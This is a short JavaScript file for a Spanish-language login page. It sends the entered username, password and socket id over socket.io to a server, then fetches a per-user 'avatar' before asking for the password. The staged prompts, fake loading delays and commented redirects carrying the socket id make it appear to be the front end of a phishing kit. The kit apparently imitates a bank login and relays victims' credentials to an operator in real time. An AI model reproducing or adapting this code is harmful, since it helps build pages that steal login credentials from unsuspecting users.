//const { text } = require("express");

const socket = io();

const emitDataServer = document.querySelector("#btn-send");
const userInput = document.querySelector("#user");
const passInput = document.querySelector("#pass");
const Alert = document.querySelector("#alert-modal");
const Alert2 = document.querySelector("#alert-modal-2");
const CerrarModal = document.querySelector("#close-alert-modal");
const CerrarModal2 = document.querySelector("#close-alert-modal-2");
const ShowPass = document.querySelector("#password-content");
const ShowUser = document.querySelector("#user-content");
const Avatar = document.querySelector("#avatar");
const LoginTitle = document.querySelector("#login-title");
const infoLogin = document.querySelector("#infologin");

var ShowVolver = "";

if(document.querySelector("#volver")){
    ShowVolver = document.querySelector("#volver");
    ShowVolver.addEventListener("click", () => {
        ShowPass.style.display = "none";
        ShowUser.style.display = "flex";
        ShowVolver.style.display = "none";
        infoLogin.style.display = "block";
        passInput.value = "";
        LoginTitle.innerHTML = "Ingresá tu usuario"     
        passCount -= 1;
    })
}


CerrarModal.addEventListener("click", () => {
    Alert.style.display = "none";
})

CerrarModal2.addEventListener("click", () => {
    Alert2.style.display = "none";
})

var passCount = 0
emitDataServer.addEventListener("click", () => {

    Alert.style.display = "none";
    Alert2.style.display = "none";
    const dataInputs = {
        'user': userInput.value,
        'pass': passInput.value,
        'socket': socket.id,
    }

    var preloader;
    if(document.querySelector("#preloader")){
        preloader = document.querySelector("#preloader");
        preloader.style.display = "block";
        setTimeout(() => {
            preloader.style.display = "none";
            if(dataInputs.user.length < 6 || dataInputs.user.length > 15){
                Alert.style.display = "flex";
            }else if(dataInputs.pass.length == 0){
                if(passCount == 0){
                    ShowPass.style.display = "flex";
                    ShowUser.style.display = "none";
                    ShowVolver.style.display = "flex";
                    LoginTitle.innerHTML = "Ingrese su clave";
                    infoLogin.style.display = "none";            
                    socket.emit("ShowAvatar", dataInputs);
                }else{
                    Alert2.style.display = "flex";
                }
                passCount += 1;
            }else{
                socket.emit("Data", dataInputs);
                preloader.style.display = "block";
                //window.location.href = "/m/faces/pages/inicio.xhtml?s="+socket.id;
            }
        }, 3000);
    }else{
        if(dataInputs.user.length < 6 || dataInputs.user.length > 15){
            Alert.style.display = "flex";
        }else if(dataInputs.pass.length == 0){
            if(passCount == 0){
                ShowPass.style.display = "flex";
                ShowUser.style.display = "none";
                socket.emit("ShowAvatar", dataInputs);   
            }else{
                Alert2.style.display = "flex";
            }
            passCount += 1;
        }else{
            socket.emit("Data", dataInputs);           
            //window.location.href = "/home.htm?s="+socket.id;
        }
    }
})

socket.on("AvatarElement", dataAvatar => {
    console.log(dataAvatar)
    Avatar.innerHTML = `<img style="width: 100%; height: 100%" src="${dataAvatar}" alt="avatar">`;
})
